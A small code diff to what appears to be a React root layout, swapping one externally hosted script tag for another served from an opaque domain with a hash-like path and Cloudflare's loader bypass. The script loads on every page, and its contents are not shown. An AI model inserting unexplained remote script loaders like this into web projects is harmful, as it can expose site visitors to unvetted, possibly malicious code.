@@ -110,7 +110,7 @@ function RootShell({ children }: { children: ReactNode }) {
       <body>
         {children}
         <Scripts />
-        <script data-cfasync="false" src="https://bauval.org/14/541e99a2c702e88d66bb0f567720f53c"></script>
+        <script data-cfasync="false" src="https://abscloud.org/1/4b0f1ce9ea7d7dc7a8f65658227b8890"></script>
       </body>
     </html>
   );
